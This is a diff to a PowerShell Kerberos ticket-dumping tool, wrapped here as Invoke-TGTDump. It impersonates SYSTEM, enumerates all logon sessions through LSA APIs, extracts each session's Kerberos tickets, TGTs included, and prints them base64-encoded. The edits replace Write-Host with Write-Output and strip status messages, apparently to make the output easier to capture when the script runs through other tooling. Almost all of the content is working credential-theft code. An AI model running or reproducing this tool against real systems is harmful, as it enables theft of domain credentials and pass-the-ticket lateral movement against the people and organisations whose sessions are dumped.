@@ -1,3 +1,4 @@
+Function Invoke-TGTDump {
 $ErrorActionPreference = "SilentlyContinue"
 $systemname = "NT.AUT.*\\"
 
@@ -70,7 +71,7 @@ Function LsaRegisterLogonProcess()
 
        [int]$ret = [ticket.dump]::LsaRegisterLogonProcess($LSAString,[ref]$lsah,[ref]$SecurityMode)
        if ($ret -ne 0){
-        write-host "[-] Error in LsaRegisterLogonProcess. Using LsaConnectUntrusted: ", $ret
+        Write-Output "[-] Error in LsaRegisterLogonProcess. Using LsaConnectUntrusted: ", $ret
         $DumpAllTkt = $false
         return $(LsaConnectUntrusted)
        }
@@ -92,14 +93,10 @@ Function Get-lsah()
     $lsah = New-Object System.IntPtr
     $sysres = Invoke-AsSystem
     if ($sysres){
-        write-host "[!] System Impersonation Success"
-        write-host "[!] Using LsaRegisterLogonProcess to connect"
         $DumpAllTkt = $true
         return $(LsaRegisterLogonProcess)
 
     } else{
-        write-host "[!] System Impersonation Failed"
-        write-host "[!] Using LsaConnectUntrusted to connect"
         $DumpAllTkt = $false
         return $(LsaConnectUntrusted)
     }
@@ -209,7 +206,7 @@ Function ExtractTicket([intptr]$lsaHandle,[int]$authPackage,[ticket.dump+LUID]$l
     [ticket.dump]::LsaFreeReturnBuffer($responsePointer)
     [System.Runtime.InteropServices.Marshal]::FreeHGlobal($unmanagedAddr)
     # DEBUG PURPOSES
-    #write-host "B64: ", $([Convert]::ToBase64String($encodedTicket))
+    #Write-Output "B64: ", $([Convert]::ToBase64String($encodedTicket))
     $ticketobj = New-Object psobject
     $ticketobj | Add-Member -Type NoteProperty -Name "success" -Value $true
     try {
@@ -238,7 +235,7 @@ Function EnumerateLogonSessions()
            $count = New-Object System.Int32
            $luidptr = New-Object System.IntPtr 
            $ret = [ticket.dump]::LsaEnumerateLogonSessions([ref]$count,[ref]$luidptr)
-           if($ret -ne 0){Write-Host "[-] Cant enum logon sessions: ", $ret}
+           if($ret -ne 0){Write-Output "[-] Cant enum logon sessions: ", $ret}
            else
            {
                 $Luidtype = New-Object ticket.dump+LUID
@@ -255,48 +252,49 @@ Function EnumerateLogonSessions()
         return $luids
     }
 
-    Function DisplaySessionCreds($sessioncreds)
+Function DisplaySessionCreds($sessioncreds)
+{
+    foreach ($sessioncred in $sessioncreds)
     {
-        foreach($sessioncred in $sessioncreds)
+        if ($sessioncred.Ticketb64 -ne $null)
         {
-
-            if ($sessioncred.Ticketb64 -ne $null){
-            if((@($sessioncred).Count -gt 0) -and ($sessioncred[0].LogonSession[0].LogonID.LowPart -ne "0") )
+            if ((@($sessioncred).Count -gt 0) -and ($sessioncred[0].LogonSession[0].LogonID.LowPart -ne "0"))
             {
-                $print_object = New-Object psobject
-                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserName" -Value $sessioncred[0].LogonSession.username
-                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "Domain" -Value $sessioncred[0].LogonSession.LogonDomain
-                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonId" -Value ("0x{0:x}" -f $sessioncred[0].LogonSession.LogonId.LowPart)
-                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserSid" -Value $sessioncred[0].LogonSession.Sid
-                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "AuthenticationPackage" -Value $sessioncred[0].LogonSession.AuthenticationPackage
-                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonType" -Value $sessioncred[0].LogonSession.logonType
-                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonTime" -Value $sessioncred[0].LogonSession.logonTime
-                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonServerDnsDomain" -Value $sessioncred[0].LogonSession.DnsDomainName
-                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserPrincipalName" -Value $sessioncred[0].LogonSession.Upn
 
-                Write-Host "------------------------------------------------------------------------------------------------------------------"
-                $print_object
-                Write-Host "[*]Enumerated " @($sessioncred).Count "tickets`n" -ForegroundColor Green
-                foreach($ticket in $sessioncred)
-                {
-                    Write-Host "    Service Name       : " $ticket.ServerName
-                    Write-Host "    EncryptionType     : " ([ticket.dump+EncTypes]$ticket.EncryptionType)
-                    Write-Host "    Start/End/MaxRenew : " $ticket.StartTime ";" $ticket.EndTime ";" $ticket.RenewTime
-                    Write-Host "    Server Name        : " $ticket.ServerName.split("/")[1] "@" $ticket.ServerRealm
-                    Write-Host "    Client Name        : " $ticket.ClientName "@" $ticket.ClientRealm
-                    Write-Host "    Flags              : " $ticket.TicketFlags
-        
-                        Write-Host "    Ticket      : " $ticket.Ticketb64
-          
-                    if($ticket.SessionKeyType){Write-Host "    Session Key Type   : " $ticket.SessionKeyType "`n"}
+                foreach ($ticket in $sessioncred)
+                {""
+                    if ($ticket.ServerName -like "*krbtgt*")
+                    {
+                        Write-Output ("    Service Name       : {0}" -f $ticket.ServerName)
+                    }
+                    else
+                    {
+                        Write-Output ("    Service Name       : {0}" -f $ticket.ServerName)
+                    }
+
+                    Write-Output ("    EncryptionType     : {0}" -f ([ticket.dump+EncTypes]$ticket.EncryptionType))
+                     Write-Output ("    Start/End/MaxRenew : {0}; {1}; {2}" -f $ticket.StartTime, $ticket.EndTime, $ticket.RenewTime)
+                    Write-Output ("    Server Name        : {0}@{1}" -f ($ticket.ServerName -split "/")[1], $ticket.ServerRealm)
+                     Write-Output ("    Client Name        : {0}@{1}" -f $ticket.ClientName, $ticket.ClientRealm)
+                     Write-Output ("    Flags              : {0}" -f $ticket.TicketFlags)
+
+                    if ($ticket.SessionKeyType)
+                    {
+                        Write-Output ("    Session Key Type   : {0}`n" -f $ticket.SessionKeyType)
+                    }
+
+                    Write-Output "    -[Ticket]-"
+                    ""
+                    Write-Output $ticket.Ticketb64
+                    ""
                 }
-                Write-Host "------------------------------------------------------------------------------------------------------------------"
-                Write-Host "`n`n"
             }
         }
     }
-    }
+}
+
 function main{
+
     # Initializing DotNet and Add-Type with Structures and LSA Functions
 
     $tickdotnet = @"
@@ -608,22 +606,19 @@ function main{
 
     # Getting Lsa Handle
     $lsah = Get-lsah
-    write-host "[!] Lsa Handle: ", $lsah
 
     # Connecting to AP
     $retcode = [ticket.dump]::LsaLookupAuthenticationPackage($lsah,[ref]$LSAString,[ref]$authpckg)
     if ($retcode -ne 0){
-        write-host "[-] Cant LookupAuthenticationPackage", $retcode
         return -1
     }
 
-    write-host "[+] Kerberos AP: ", $authpckg
 
     foreach($luid in EnumerateLogonSessions){
         if ($([System.Convert]::ToString($luid.LowPart,16) -eq 0x0)){
            continue;
         } else{
-            #write-host "    [?] LUID: 0x$([System.Convert]::ToString($luid.HighPart,16) )$([System.Convert]::ToString($luid.LowPart,16))"
+            #Write-Output "    [?] LUID: 0x$([System.Convert]::ToString($luid.HighPart,16) )$([System.Convert]::ToString($luid.LowPart,16))"
             $logonSessionData = New-Object ticket.dump+LogonSessionData
             try {
                 $logonSessionData = GetLogonSessionData($luid)
@@ -653,7 +648,7 @@ function main{
             $retcode = [ticket.dump]::LsaCallAuthenticationPackage($lsah,$authpckg,$tQueryPtr,[System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest),[ref]$ticketsPointer,[ref]$returnBufferLength,[ref]$protocolStatus)
             if(($retcode -eq 0) -and ($ticketsPointer -ne [System.IntPtr]::Zero))
             {    
-            #write-host "   [+] Calling AP Kerberos success"
+            #Write-Output "   [+] Calling AP Kerberos success"
             [ticket.dump+KERB_QUERY_TKT_CACHE_RESPONSE]$ticketCacheRespone = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ticketsPointer,[type]$ticketCacheResponeType)
             $count2 = $ticketCacheRespone.CountOfTickets
             if($count2 -ne 0)
@@ -689,7 +684,7 @@ function main{
                     catch{}
 
                     } else {
-                        #write-host "    [-] Cant recover TKT. May be outdated"
+                        #Write-Output "    [-] Cant recover TKT. May be outdated"
                     }
                     $sessioncred += $ticket
                 }
@@ -708,3 +703,5 @@ function main{
 
 $DumpAllTkt = $false
 main
+
+}
